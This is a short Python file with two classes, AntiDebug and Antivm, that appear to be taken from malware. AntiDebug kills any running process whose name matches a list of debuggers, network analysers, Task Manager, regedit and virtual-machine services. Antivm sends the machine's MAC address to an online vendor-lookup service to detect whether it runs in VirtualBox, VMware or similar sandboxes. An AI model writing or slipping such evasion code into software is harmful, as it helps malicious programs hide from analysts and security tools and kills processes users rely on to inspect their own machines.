import psutil
import requests
import uuid

class AntiDebug:
    def checks(self) -> bool:
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

        self.check_process()

    def check_process(self) -> None:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

class Antivm:
    mac_vm=["Oracle", "Pcs Systemtechnik GmbH","VMWare","Microsoft","Parallels","VM","Virtual Machine","Super Micro Computer"]

    def get_mac():
        mac = (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
        for ele in range(0,8*6,8)][::-1]))
        return mac


    def info(macaddr:str):
        r=requests.get(f"https://api.macvendors.com/{macaddr}")
        if r.status_code == 200:
            return True, r.text
        else:
            return False, "Invalid"

    def run():
        mac = Antivm.get_mac()
        vm = False
        success, vendor = Antivm.info(mac)
        for x in Antivm.mac_vm:
            key = x.replace(","," ")
            key = key.split()
            
            if x == vendor:
                vm=True
            
            if x.lower() == vendor.lower():
                vm = True
                
            for y in key:
                
                vendor_s=vendor.replace(","," ")
                vendor_s=vendor_s.replace("."," ")
                vendor_s=vendor_s.split()

                for z in vendor_s:
                    if y == z:
                        vm = True
                    if y.lower() == z.lower():
                        vm = True
        return vm